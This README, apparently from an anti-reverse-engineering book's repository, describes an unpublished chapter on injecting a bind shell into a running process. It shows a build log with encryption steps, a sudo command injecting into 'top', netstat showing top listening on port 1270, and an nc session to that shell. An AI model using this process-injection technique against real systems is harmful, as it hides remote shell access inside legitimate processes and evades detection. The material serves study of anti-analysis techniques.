# The Unwritten Chapter
This chapter centered around injecting code (wooden_house) into another running
process and starting a pthread. In this way, the bind shell is injected into
an entirely different process which is pretty neat. However, it takes a lot of
work and I just decided it wasn't worth including in the write up. However,
all the code is available here.

Example usage:
```sh
albino-lobster@ubuntu:~/antire_book/unwritten_chapter/dontpanic/build$ make
[ 13%] Built target computeChecksums
[ 31%] Built target encryptSections
[ 40%] Built target cryptor
[ 50%] Built target stripBinary
[ 59%] Built target convertToFile
[ 68%] Built target woodenhouse
[ 68%] Built target addLDS
Scanning dependencies of target trouble
[ 72%] Building C object trouble/CMakeFiles/trouble.dir/src/main.c.o
[ 77%] Building C object trouble/CMakeFiles/trouble.dir/src/load_binary.c.o
[ 81%] Building C object trouble/CMakeFiles/trouble.dir/__/common/crypto/crc32.c.o
[ 86%] Building C object trouble/CMakeFiles/trouble.dir/__/common/crypto/rc4.c.o
[ 90%] Linking C executable trouble
[+] Encrypted 0x9f030
1+0 records in
1+0 records out
1 byte copied, 6.3449e-05 s, 15.8 kB/s
[100%] Built target trouble
albino-lobster@ubuntu:~/antire_book/unwritten_chapter/dontpanic/build$ sudo ./trouble/trouble `pidof top`
[sudo] password for albino-lobster: 
albino-lobster@ubuntu:~/antire_book/unwritten_chapter/dontpanic/build$ sudo netstat -tlpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.1.1:53            0.0.0.0:*               LISTEN      1029/dnsmasq    
tcp        0      0 0.0.0.0:1270            0.0.0.0:*               LISTEN      41489/top
albino-lobster@ubuntu:~/antire_book/unwritten_chapter/dontpanic/build$ nc 127.0.0.1 1270
ls -l
exit
albino-lobster@ubuntu:~/antire_book/unwritten_chapter/dontpanic/build$ 
```

The bind shell has been injected into top. Pretty fun, huh?
